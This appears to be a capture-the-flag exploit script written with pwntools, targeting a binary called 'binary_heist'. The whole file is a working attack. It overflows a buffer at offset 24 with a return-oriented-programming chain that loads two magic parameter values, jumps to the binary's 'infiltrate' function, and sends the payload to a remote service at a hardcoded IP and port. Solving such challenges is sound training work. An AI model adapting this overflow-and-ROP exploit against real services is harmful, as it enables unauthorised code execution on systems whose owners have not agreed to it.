from pwn import * 
exe = context.binary = ELF('binary_heist')
libc = ELF('libc.so.6')
rop = ROP(libc)
# Find the gadgets
popem = 0x401207
winaddr = exe.symbols['infiltrate']
log.info('winaddr: ' + hex(winaddr))
io = remote('65.0.128.220', 31518) #process(exe.path, env={'LD_PRELOAD': libc.path})
io.recvuntil(b'log: \n')
#gdb.attach(io)
rop_chain = p64(popem)
rop_chain += p64(0x1337c0d31337c0d3)  # param_1 value
rop_chain += p64(0xacedc0deacedc0de)  # Use the actual two's complement value for param_2
rop_chain += p64(winaddr)
payload = fit({
    24: rop_chain
})
io.sendline(payload)
print(io.recvall())